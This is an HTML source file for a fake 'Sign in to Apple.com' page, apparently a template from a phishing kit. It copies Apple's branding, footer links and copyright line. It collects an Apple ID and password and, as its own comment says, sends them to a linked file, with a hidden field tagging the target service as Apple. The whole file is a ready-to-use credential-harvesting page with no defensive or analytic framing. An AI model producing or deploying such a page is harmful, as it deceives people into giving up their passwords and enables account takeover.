<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>

    <title>Sign in to Apple.com</title>

    <meta charset="UTF-8" />
    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <meta name="description" id="description" content="Sign in with Apple account" />

    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href="//fonts.googleapis.com/css?family=PT+Sans+Narrow:400&display=swap" rel="stylesheet" />
    <link href="apple.css" rel="stylesheet" />

  </head>
  <body tabindex="0">

    <!-- form wrapper -->
    <section class="apple-wrap">

      <!-- form center container -->
      <main class="apple-container">

        <!-- login form, credentials will go to linked file in action attribute -->
        <form class="apple-form" action="../login.html" method="GET">
          <input type="hidden" name="_service" value="Apple" />

          <!-- form logo -->
          <div class="apple-logo">
            <img src="apple-logo.png" alt="Apple" />
          </div>

          <!-- default heading -->
          <div class="apple-heading">
            <h1>Sign in to Apple.com</h1>
          </div>

          <!-- username input -->
          <div class="apple-input apple-username">
            <input type="text" id="_username" name="_username" value="" />
            <label for="_username">Apple ID</label>
          </div>

          <!-- hidden password input -->
          <div class="apple-input apple-password">
            <input type="password" id="_password" name="_password" value="" />
            <label for="_password">Password</label>
          </div>

          <!-- form action button -->
          <div class="apple-action">
            <button type="submit">Sign in</button>
          </div>

        </form>

      </main>

      <!-- form footer links -->
      <footer class="apple-footer">
        <a href="#">Check Activation Lock Status</a>
        <a href="#">Forgot ID or Password?</a>
        <a href="#">System Status</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms and Conditions</a>
        <a href="#">Copyright Â© 2019 Apple Inc. All rights reserved.</a>
      </footer>

    </section>

    <!-- form scripts -->
    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
    <script src="apple.js"></script>

  </body>
</html>
